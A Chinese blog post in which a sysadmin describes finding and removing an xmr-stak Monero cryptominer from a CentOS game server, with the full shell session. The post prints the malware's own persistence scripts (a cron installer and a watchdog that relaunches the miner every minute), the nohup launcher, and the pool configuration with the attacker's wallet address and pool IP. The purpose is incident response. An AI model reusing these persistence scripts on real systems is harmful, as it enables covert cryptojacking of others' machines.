---
layout: post
title: 服务器被挂码-门罗币挖矿程序
tags: linux, centos
categories: centos
---

照例巡视服务器，查看cpu，内存，硬盘，系统日志。
GameServer的机器，cpu 和 内存 使用上有点不对，进程数有点多了， 但是cpu和内存却很平稳，没有波动！
另外系统日志中出现了之前没有见过的进程日志。

依据之前处理dota3木马攻击的方式，检查一遍crontab等，确认下是不是有异常！


#### 1. 查看当前服务器所有用户的crontab：
```shell
[root@GameServer /]# cat /etc/passwd | cut -f 1 -d : |xargs -I {} crontab -l -u {}

* * * * * /home/user_game/.python2.0/upd >/dev/null 2>&1
```
发现了一个隐藏目录的定时脚本，每分钟执行一次 udp。

#### 2. 确认账号下的定时脚本：
```shell
[root@GameServer /]#crontab -l -u user_game
* * * * * /home/user_game/.python2.0/upd >/dev/null 2>&1
```
#### 3. 清理账号下的定时脚本：
```shell
[root@GameServer /]# crontab -r -u user_game
```
#### 4. 确认清理结果：
```shell
[root@GameServer /]# crontab -l -u user_game
no crontab for user_game
```

#### 5. 进入隐藏目录，查看文件：
```shell
[root@GameServer /]# cd /home/user_game/.python2.0
[root@GameServer .python2.0]# ls -la
total 233652
drwxr-xr-x 3 user_game users      4096 Jul 21  2019 .
drwx------ 5 user_game users      4096 Aug  5  2019 ..
-rwxr-xr-x 1 user_game users       329 Oct 27  2019 a
-rw-rw-r-- 1 user_game users         6 Jul 21  2019 bash.pid
-rw-r--r-- 1 user_game users      7581 Apr 16  2019 config.txt
-rw-rw-r-- 1 user_game users      1883 Jul 21  2019 cpu.txt
-rw-r--r-- 1 user_game users        51 Jul 21  2019 cron.d
-rw-rw-r-- 1 user_game users        21 Jul 21  2019 dir.dir
-rwxr-xr-x 1 user_game users     15125 Feb 21  2019 h32
-rwxr-xr-x 1 user_game users    838583 Feb 21  2019 h64
-rwxr-xr-x 1 user_game users    227220 Oct 22  2019 md32
-rw-rw-r-- 1 user_game users 238111448 Jul  7 10:29 output.txt
-rw-r--r-- 1 user_game users      1590 May 13  2019 pools.txt
-rwxr-xr-x 1 user_game users       467 Jul 21  2019 run
drwxr-xr-x 2 user_game users      4096 Apr 16  2019 stak
-rwxr--r-- 1 user_game users       209 Jul 21  2019 upd
-rwxr-xr-x 1 user_game users        24 Oct  5  2019 x
```
#### 6. 查看类似crontab的文件cron.d：
```shell
[root@GameServer .python2.0]# cat cron.d 
* * * * * /home/user_game/.python2.0/upd >/dev/null 2>&1
```
#### 7. 查看定时脚本执行的upd内容：
```shell
[root@GameServer .python2.0]# cat upd 
#!/bin/sh
if test -r /home/user_game/.python2.0/bash.pid; then
pid=$(cat /home/user_game/.python2.0/bash.pid)
if $(kill -CHLD $pid >/dev/null 2>&1)
then
sleep 1
else
cd /home/user_game/.python2.0
./run &>/dev/null
exit 0
fi
fi
```
脚本执行流程：先干掉 bash.pid, 再等待一秒后，运行run，执行一次就退出。

#### 8. 发现定时脚本，又出现了：
```shell
[root@GameServer /]#crontab -l -u user_game
* * * * * /home/user_game/.python2.0/upd >/dev/null 2>&1
```
#### 9. 再次清理后，查看当前目录的其他文件：
```shell
[root@GameServer .python2.0]# cat x 
nohup ./a >>/dev/null &
```
原来还有一个nohup！！

#### 10. 查看 a 文件内容：
```shell
[root@GameServer .python2.0]# cat a 
pwd > dir.dir
dir=$(cat dir.dir)
echo "* * * * * $dir/upd >/dev/null 2>&1" > cron.d
crontab cron.d
crontab -l | grep upd
echo "#!/bin/sh
if test -r $dir/bash.pid; then
pid=\$(cat $dir/bash.pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
sleep 1
else
cd $dir
./run &>/dev/null
exit 0
fi
fi" >upd
chmod u+x upd
./run &>/dev/null
```
#### 10. 查找nohup进程：
```shell
[root@GameServer /]# ps -ef | grep './a'
root      17781   1894  2 14:33 pts/1    00:00:00 ./a
root      17791   1894  0 14:34 pts/1    00:00:00 grep --color=auto ./a
```
#### 11. kill -9杀掉进程，同时清理crontab：
```shell
[root@GameServer /]# kill -9 17781
[root@GameServer /]# crontab -r -u user_game
```
#### 12. 查看a文件中的使用到的dir.dir文件内容：
```shell
[root@GameServer .python2.0]# cat dir.dir 
/home/user_game/.python2.0
```
#### 13. 查看当前目录的txt文件，cpu.txt：
```shell
[root@GameServer .python2.0]#  cat cpu.txt 
...
"cpu_threads_conf" :
[
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 1 },

],
...
```
似乎是运行情况日志。
#### 14. 查看当前目录的txt文件，output.txt：
```shell
[root@GameServer .python2.0]# tail output.txt 
[2020-07-07 10:28:56] : SOCKET ERROR - [107.191.99.227:80] CONNECT error: Connection timed out
[2020-07-07 10:29:25] : Fast-connecting to 107.191.99.227:80 pool ...
HASHRATE REPORT - CPU
| ID |    10s |    60s |    15m | ID |    10s |    60s |    15m |
|  0 |   (na) |   (na) |   (na) |  1 |   (na) |   (na) |   (na) |
Totals (CPU):     0.0    0.0    0.0 H/s
-----------------------------------------------------------------
Totals (ALL):      0.0    0.0    0.0 H/s
Highest:   155.2 H/s
-----------------------------------------------------------------
```
输出的是连接远程服务器超时！

#### 15. 查看当前目录的txt文件，pools.txt：
```shell
[root@GameServer .python2.0]# cat pools.txt

"pool_list" :
[
        {
            "pool_address" : "107.191.99.227:80", 
            "wallet_address":"49GCPDCt138h1Qg25WfEynSZgCbQkWLr8KrtN5hUW1xwewEzf2YhmL477Zpf6CXUH5JXMtdEcy8rP8z6zKzJD5TADDb8QXs", 
            "pool_password" : "x", 
            "use_nicehash" : false, 
            "rig_id" : "", 
            "use_tls" : false, 
            "tls_fingerprint" : "", 
            "pool_weight" : 1 
        },
],
```
看到了钱包地址wallet_address，似乎还有密码“x”！！


#### 16. 还有个stak目录，看下里面的东西：
```shell
[root@GameServer .python2.0]# cd stak/
[root@GameServer stak]# ll
total 28456
-rwxr-xr-x 1 user_game user_game   162632 Nov 20  2019 ld-linux-x86-64.so.2
-rwxr-xr-x 1 user_game user_game  2361856 Nov 20  2019 libcrypto.so.1.0.0
-rwxr-xr-x 1 user_game user_game  1868984 Nov 20  2019 libc.so.6
-rwxr-xr-x 1 user_game user_game    14608 Nov 20  2019 libdl.so.2
-rwxr-xr-x 1 user_game user_game    31104 Nov 20  2019 libffi.so.6
-rwxr-xr-x 1 user_game user_game    89696 Nov 20  2019 libgcc_s.so.1
-rwxr-xr-x 1 user_game user_game   919168 Nov 20  2019 libgcrypt.so.20
-rwxr-xr-x 1 user_game user_game   522664 Nov 20  2019 libgmp.so.10
-rwxr-xr-x 1 user_game user_game  1239440 Nov 20  2019 libgnutls.so.30
-rwxr-xr-x 1 user_game user_game    80496 Nov 20  2019 libgpg-error.so.0
-rwxr-xr-x 1 user_game user_game   207640 Nov 20  2019 libhogweed.so.4
-rwxr-xr-x 1 user_game user_game   236992 Nov 20  2019 libhwloc.so.5
-rwxr-xr-x 1 user_game user_game   207208 Nov 20  2019 libidn.so.11
-rwxr-xr-x 1 user_game user_game    39272 Nov 20  2019 libltdl.so.7
-rwxr-xr-x 1 user_game user_game    97232 Nov 20  2019 libmicrohttpd.so.10
-rwxr-xr-x 1 user_game user_game  1088952 Nov 20  2019 libm.so.6
-rwxr-xr-x 1 user_game user_game   219336 Nov 20  2019 libnettle.so.6
-rwxr-xr-x 1 user_game user_game    43936 Nov 20  2019 libnuma.so.1
-rwxr-xr-x 1 user_game user_game    27424 Nov 20  2019 libOpenCL.so.1
-rwxr-xr-x 1 user_game user_game   408472 Nov 20  2019 libp11-kit.so.0
-rwxr-xr-x 1 user_game user_game   138696 Nov 20  2019 libpthread.so.0
-rwxr-xr-x 1 user_game user_game    31712 Nov 20  2019 librt.so.1
-rwxr-xr-x 1 user_game user_game   428384 Nov 20  2019 libssl.so.1.0.0
-rwxr-xr-x 1 user_game user_game  1566440 Nov 20  2019 libstdc++.so.6
-rwxr-xr-x 1 user_game user_game    76192 Nov 20  2019 libtasn1.so.6
-rw-r--r-- 1 user_game user_game  1250904 Apr 16  2019 libxmr-stak-backend.a
-rw-r--r-- 1 user_game user_game    74206 Apr 16  2019 libxmr-stak-c.a
-rwxr-xr-x 1 user_game user_game 13184504 Nov 20  2019 libxmrstak_cuda_backend.so
-rwxr-xr-x 1 user_game user_game   758504 Nov 20  2019 libxmrstak_opencl_backend.so
-rwxr-xr-x 1 user_game user_game   104864 Nov 20  2019 libz.so.1
-rwxr-xr-x 1 user_game user_game  1609409 Apr 16  2019 xmr-stak
```

两个非常可疑的库文件libxmr-stak-c.a和libxmr-stak-backend.a。Google这两个文件，发现这是门罗币挖矿程序使用的名字!!

#### 17. 删除用户：
```shell
[root@GameServer /]# userdel user_game
userdel: user user_game is currently used by process 95786
```
当前用户还有脚本在跑。

#### 18. 找到进程id为95786的信息：
```shell
[root@GameServer /]# ll /proc/95786
total 0
dr-xr-xr-x 2 user_game user_game 0 Jul  7 10:40 attr
-rw-r--r-- 1 user_game user_game 0 Jul  7 10:40 autogroup
-r-------- 1 user_game user_game 0 Jul  7 10:40 auxv
-r--r--r-- 1 user_game user_game 0 Jul  7 10:40 cgroup
--w------- 1 user_game user_game 0 Jul  7 10:40 clear_refs
-r--r--r-- 1 user_game user_game 0 Jul  7 10:32 cmdline
-rw-r--r-- 1 user_game user_game 0 Jul  7 10:40 comm
-rw-r--r-- 1 user_game user_game 0 Jul  7 10:40 coredump_filter
-r--r--r-- 1 user_game user_game 0 Jul  7 10:40 cpuset
lrwxrwxrwx 1 user_game user_game 0 Jul  7 10:40 cwd -> /home/user_game/.python2.0
-r-------- 1 user_game user_game 0 Jul  7 10:40 environ
lrwxrwxrwx 1 user_game user_game 0 Jul  7 10:40 exe -> /home/user_game/.python2.0/stak/ld-linux-x86-64.so.2
```
#### 19. 杀掉进程：
```shell
[root@GameServer /]# kill -9 95786
```
#### 20. 清理隐藏用户目录：
```shell
[root@GameServer /]# rm -rf /home/user_game
```
#### 21. 查看用户属性和所在组：
```shell
[root@GameServer /]# id user_game
uid=495(user_game) gid=495(user_game) groups=495(user_game)
```
#### 23. 再次删除用户，同时删除用户组：
```shell
[root@GameServer /]# userdel user_game && groupdel user_game
userdel: user user_game is currently used by process 95786
```
#### 24. 再次删除用户，同时删除用户组：
```shell
[root@GameServer user_00]# cat /etc/passwd | grep vpn
[root@GameServer user_00]# cat /etc/shadow | grep vpn
```
#### 25. 确认用户组还有无残留文件：
```shell
[root@GameServer /]# find . -group user_game -exec ls -l {} \;
total 0
find: `./proc/53545/task/53545/fd/5': No such file or directory
find: `./proc/53545/task/53545/fdinfo/5': No such file or directory
find: `./proc/53545/fd/5': No such file or directory
find: `./proc/53545/fdinfo/5': No such file or directory
find: `./proc/53546': No such file or directory
find: `./proc/53546': No such file or directory
find: `./proc/53547': No such file or directory
find: `./proc/53547': No such file or directory
find: `./proc/53553': No such file or directory
find: `./proc/53553': No such file or directory
```

至此，清理完毕！
